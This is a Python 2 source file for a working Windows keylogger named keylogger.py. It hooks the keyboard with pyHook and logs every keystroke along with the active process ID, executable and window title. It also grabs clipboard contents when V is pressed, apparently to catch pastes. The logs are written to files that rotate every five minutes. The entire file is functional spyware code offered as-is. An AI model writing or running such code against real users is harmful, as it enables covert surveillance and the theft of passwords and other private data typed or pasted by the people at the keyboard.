from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import sys
import time
import os

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
last_log_time = time.time()

class Logger(object):
    def __init__(self, filename = "keylogs.log"):
        self.terminal = sys.stdout
        self.log = open(filename, "w")

    def write(self, message):
        global last_log_time
        self.terminal.write(message)
        self.log.write(message)
        #self.log.flush()
        curr_time = time.time()
                
        if curr_time - last_log_time > 300: #5 minutes
            self.log.close()
            filename = getLogFileName()
            self.log = open( filename,"w")
            last_log_time = curr_time
            print "\n=================================================================================="
            print "Open New Log File " + filename
            print "=================================================================================="
    
    def __del__(self):
        self.log.close()
        
    def __exit__(self):
        self.log.close()
        
    def close(self):
        self.log.close()


def get_current_process():
    hwnd = user32.GetForegroundWindow()
    
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    
    # Process id
    process_id = "%d" %pid.value
    
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    
    window_title =create_string_buffer("\x00"*512)
    user32.GetWindowTextA(hwnd, byref(window_title),512)
    
    print
    print "======[PID:%s][%s][%s]======"%(process_id, executable.value, window_title.value)
    print
    
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    
    global current_window
    
    
    if event.WindowName != current_window:
        current_window = event.WindowName
        #print "\n==============================================="
        #print "Current Window: "+current_window
        get_current_process()
    
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii),
        
    else:
        if event.Key == "V":
            
            try:
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                print "<PASTE> - %s" %(pasted_value),
            except TypeError as e:
                print "\n[Error when PASTE]:"+str(e)
                
            win32clipboard.CloseClipboard() 
                
        else:
            print "<%s>"%event.Key,
          
    return True

def getLogFileName():
    
    curr_time = time.strftime("%Y_%m%d_%H%M")    
    return "keylogs/log_"+curr_time+".log"

if not os.path.exists("keylogs\\"):
    os.makedirs("keylogs")

sys.stdout = Logger(getLogFileName())

print "keylogger.py is now listening....."
print "=================================================================================="

k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke 
    
k1.HookKeyboard()
pythoncom.PumpMessages()

    
        
    
    
    
    
    














